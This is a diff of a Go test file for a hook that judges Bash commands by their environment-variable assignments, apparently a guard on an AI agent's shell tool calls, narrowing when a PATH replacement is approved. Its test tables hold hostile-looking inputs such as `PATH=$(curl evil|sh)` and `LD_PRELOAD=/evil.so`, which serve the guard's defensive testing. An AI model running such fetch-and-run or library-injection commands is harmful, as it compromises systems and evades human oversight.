@@ -1455,17 +1455,18 @@ func TestEnvVars_HermeticEnvReplacement_InjectorStillRejects(t *testing.T) {
 // ==================== pg2-dhugk: isStaticAbsoluteOnlyPathReplacement ====================
 
 // TestEnvVars_StaticAbsoluteOnlyPathReplacement_Approve pins pg2-dhugk's own
-// relief: a PATH REPLACEMENT whose value is composed entirely of static
-// absolute components Approves WITHOUT requiring `env -i` — the accepted
-// residual-risk shape the 2026-09-17 operator ruling authorized — so long as
-// the assignment is still the whole leaf. Both the direct-literal form and
-// the in-command-variable form (the bead's own motivating corpus shape,
-// `NEWPATH="..."; ... PATH="$NEWPATH"`) are covered.
+// relief AS NARROWED (2026-09-17 20:27 decision, correcting commit
+// 2db053bc's first, too-broad landing): a PATH REPLACEMENT whose value is
+// composed entirely of static absolute components, VARIABLE-DERIVED (a
+// reference to a name THIS SAME COMMAND bound earlier — never a bare,
+// hand-typed literal, which no longer qualifies at all, see
+// TestEnvVars_StaticAbsoluteOnlyPathReplacement_BareLiteralStillAsks),
+// Approves WITHOUT requiring `env -i` — the accepted residual-risk shape the
+// 2026-09-17 operator ruling authorized — so long as the assignment is
+// still the whole leaf. This is the bead's own motivating corpus shape,
+// `NEWPATH="..."; ... PATH="$NEWPATH"`.
 func TestEnvVars_StaticAbsoluteOnlyPathReplacement_Approve(t *testing.T) {
 	commands := []string{
-		"PATH=/usr/bin:/bin",                              // bare, command-less leaf
-		"export PATH=/usr/bin:/bin",                       // export builtin
-		"env PATH=/usr/bin:/bin",                          // bare env query
 		`NEWPATH="/a/bin:/b/bin"; PATH="$NEWPATH"`,        // in-command variable, leading
 		`NEWPATH="/a/bin:/b/bin"; export PATH="$NEWPATH"`, // in-command variable, export
 		`NEWPATH="/a/bin:/b/bin"; PATH=$NEWPATH`,          // in-command variable, unquoted
@@ -1483,15 +1484,22 @@ func TestEnvVars_StaticAbsoluteOnlyPathReplacement_Approve(t *testing.T) {
 
 // TestEnvVars_StaticAbsoluteOnlyPathReplacement_TransparentBesideCommand
 // re-asserts the pg2-0q99a Rule contract's condition 3 (assignmentIsWholeLeaf)
-// for this new relief: beside a real command the leading/scoped assignment is
-// not the whole leaf, so the Approve must not surface and cannot pre-empt the
-// command's own verdict — matching every other Approve predicate in this
-// file (TestEnvVars_AskVars_PreserveForm_TransparentBesideCommand,
-// TestEnvVars_HermeticEnvReplacement_TransparentBesideCommand).
+// for this new relief: beside a real command on the SAME leaf the
+// leading/scoped assignment is not the whole leaf, so the Approve must not
+// surface and cannot pre-empt the command's own verdict — matching every
+// other Approve predicate in this file
+// (TestEnvVars_AskVars_PreserveForm_TransparentBesideCommand,
+// TestEnvVars_HermeticEnvReplacement_TransparentBesideCommand). Both rows use
+// a VARIABLE-DERIVED value (the shape this narrowed relief actually covers,
+// per the 2026-09-17 20:27 decision) — a bare literal beside a DELEGATING
+// command (e.g. `git`) does not even reach this predicate any more, and
+// keeps the pre-existing decisive Ask fallback instead of NoOpinion; see
+// TestEnvVars_StaticAbsoluteOnlyPathReplacement_BareLiteralStillAsks for that
+// row, pinned separately so it is not confused with this one.
 func TestEnvVars_StaticAbsoluteOnlyPathReplacement_TransparentBesideCommand(t *testing.T) {
 	commands := []string{
-		"PATH=/usr/bin:/bin git status",
-		"PATH=/usr/bin:/bin echo hi",
+		`NEWPATH="/a/bin:/b/bin"; PATH="$NEWPATH" git status`,
+		`NEWPATH="/a/bin:/b/bin"; PATH="$NEWPATH" echo hi`,
 	}
 	for _, cmd := range commands {
 		t.Run(cmd, func(t *testing.T) {
@@ -1504,26 +1512,57 @@ func TestEnvVars_StaticAbsoluteOnlyPathReplacement_TransparentBesideCommand(t *t
 	}
 }
 
-// TestEnvVars_StaticAbsoluteOnlyPathReplacement_ApprovesDespiteDownstreamConsumer
-// pins the SAME "value-based relief ignores mechanism 2 entirely" property
-// preservesCallerValue/isHermeticEnvReplacement/isHermeticHomeReplacement
-// already have (TestEnvVars_ExistingValueReliefs_UnaffectedWhenConsumerFound):
-// a whole-leaf, static-absolute-only PATH REPLACEMENT still Approves the
-// ENTIRE compound even when a later leaf is a genuine consumer
-// (`git push --force`) — this is pre-existing, tested behavior for the other
-// three predicates, not something this bead's own predicate newly
-// introduces.
-func TestEnvVars_StaticAbsoluteOnlyPathReplacement_ApprovesDespiteDownstreamConsumer(t *testing.T) {
+// TestEnvVars_StaticAbsoluteOnlyPathReplacement_BareLiteralStillAsks pins
+// NARROWING condition 1 (2026-09-17 20:27 decision): a bare, hand-typed
+// literal PATH replacement beside a command that itself delegates (`git`,
+// which is not on nonDelegatingCommands) is NOT relieved by this predicate —
+// it never was proven to reference anything this command bound, so it falls
+// through to the pre-existing decisive Ask fallback exactly as it did before
+// this bead, UNCHANGED. (A non-delegating command, e.g. `echo`, stays
+// relieved regardless — via the pre-existing, unrelated mechanism 1 — see
+// TestEnvVars_ConsumptionScoped_NoConsumer_Relieved and friends.)
+func TestEnvVars_StaticAbsoluteOnlyPathReplacement_BareLiteralStillAsks(t *testing.T) {
 	commands := []string{
-		"export PATH=/x; git push --force origin main",
-		"export PATH=/x && git push --force origin main",
+		"PATH=/usr/bin:/bin git status",
+		"PATH=/x git status",
+		"env PATH=/x git status",
 	}
 	for _, cmd := range commands {
 		t.Run(cmd, func(t *testing.T) {
 			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
 			got := hookio.Verdict(New().Evaluate(input))
-			if got.Decision != hookio.Approve {
-				t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
+			if got.Decision != hookio.Ask {
+				t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
+			}
+		})
+	}
+}
+
+// TestEnvVars_StaticAbsoluteOnlyPathReplacement_SeparateLeafConsumerStillAsks
+// is the bead's own required negative test (2026-09-17 20:27 decision, "What
+// must change"): NARROWING condition 2 — an `export`/compound PATH
+// REPLACEMENT with a genuine, SEPARATE downstream consumer leaf still asks,
+// even for an otherwise-qualifying static-absolute-only, VARIABLE-DERIVED
+// value (proving condition 2 is independently enforced, not merely a
+// byproduct of condition 1's literal exclusion). This REPLACES
+// TestEnvVars_StaticAbsoluteOnlyPathReplacement_ApprovesDespiteDownstreamConsumer's
+// former assertion (Approve despite a downstream consumer, mirroring
+// preservesCallerValue/isHermeticEnvReplacement/isHermeticHomeReplacement's
+// shared property) — that property is DELIBERATELY NOT shared by this
+// predicate: `export PATH=/x && git status` regressed
+// TestIntegration_EnvVarGuard under the first, too-broad landing (commit
+// 2db053bc) precisely because of it, per the operator's narrowing decision.
+func TestEnvVars_StaticAbsoluteOnlyPathReplacement_SeparateLeafConsumerStillAsks(t *testing.T) {
+	commands := []string{
+		`NEWPATH="/a/bin:/b/bin"; export PATH="$NEWPATH"; git push --force origin main`,
+		`NEWPATH="/a/bin:/b/bin"; export PATH="$NEWPATH" && git push --force origin main`,
+	}
+	for _, cmd := range commands {
+		t.Run(cmd, func(t *testing.T) {
+			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
+			got := hookio.Verdict(New().Evaluate(input))
+			if got.Decision != hookio.Ask {
+				t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
 			}
 		})
 	}
@@ -1871,11 +1910,16 @@ func TestEnvVars_LoneAssignment_RuleVisible_Pg2mtnmb(t *testing.T) {
 		// recursion regardless of mechanism 2 (see TestEnvVars_PostRecursionAskFallback
 		// for the same fakeEvaluator behavior exercised directly).
 		{`PATH=$(curl evil|sh)`, hookio.NoOpinion},
-		// pg2-dhugk: was NoOpinion (mechanism 2 relieved it, no downstream
-		// consumer in this single-leaf command) until isStaticAbsoluteOnlyPathReplacement
-		// added a VALUE-based Approve for exactly this shape — a bare,
-		// static-absolute PATH REPLACEMENT, the whole (command-less) leaf.
-		{`PATH=/replaced`, hookio.Approve},
+		// pg2-dhugk: commit 2db053bc's first (too-broad) landing briefly
+		// changed this to Approve (isStaticAbsoluteOnlyPathReplacement's
+		// VALUE-based check matched this bare, static-absolute PATH
+		// REPLACEMENT unconditionally). The 2026-09-17 20:27 narrowing
+		// decision requires the value to be VARIABLE-DERIVED (a reference
+		// to a name this same command bound earlier) — a bare, hand-typed
+		// literal like this one no longer qualifies at all, so this reverts
+		// to mechanism 2's own pre-existing relief: NoOpinion (no downstream
+		// consumer in this single-leaf command, value-blind).
+		{`PATH=/replaced`, hookio.NoOpinion},
 		{`HOME=/tmp/fakehome`, hookio.NoOpinion},
 		{`LD_PRELOAD=/evil.so`, hookio.Reject},
 		{`BASH_FUNC_x=y`, hookio.Reject},
@@ -2387,15 +2431,26 @@ func TestEnvVars_ApproveOnlyForVerifiedPreserveForm(t *testing.T) {
 		{`T=$(mktemp -d); HOME="$T/h"`, true},
 
 		// pg2-dhugk: THE new approvable shape, per the 2026-09-17 ruling —
-		// isStaticAbsoluteOnlyPathReplacement. A PATH REPLACEMENT whose value is
-		// static-absolute-only Approves WITHOUT requiring `env -i`, so long as
-		// the assignment is still the whole leaf (condition (b) below is
-		// unrelaxed) — a literal, or a reference to a same-command variable
-		// bound to one. Formerly `false` under "(a) violated: replacement"
+		// isStaticAbsoluteOnlyPathReplacement, AS NARROWED by the same-day
+		// 20:27 decision. A PATH REPLACEMENT whose value is
+		// static-absolute-only AND variable-derived (a reference to a name
+		// this same command bound earlier) Approves WITHOUT requiring
+		// `env -i`, so long as the assignment is still the whole leaf
+		// (condition (b) below is unrelaxed) AND has no separate downstream
+		// consumer leaf. Formerly `false` under "(a) violated: replacement"
 		// before this bead.
-		{"export PATH=/x", true},
-		{"PATH=/usr/bin:/bin", true},
 		{`NEWPATH="/a/bin:/b/bin"; export PATH="$NEWPATH"`, true},
+		// A bare, hand-typed literal (no same-command variable reference at
+		// all) does NOT qualify for this relief — narrowing condition 1.
+		// Stays `false`, exactly as it was under "(a) violated: replacement"
+		// before this bead; commit 2db053bc's first, too-broad landing
+		// briefly widened these two specifically to `true`.
+		{"export PATH=/x", false},
+		{"PATH=/usr/bin:/bin", false},
+		// A variable-derived value WITH a separate downstream consumer leaf
+		// does NOT qualify either — narrowing condition 2 (mirrors mechanism
+		// 2's own domain, unlike the other three value-based predicates).
+		{`NEWPATH="/a/bin:/b/bin"; export PATH="$NEWPATH" && git push --force origin main`, false},
 
 		// pg2-kzqw2: THE new approvable shape — a component that is not itself a
 		// static absolute path but is a certified-safe command substitution
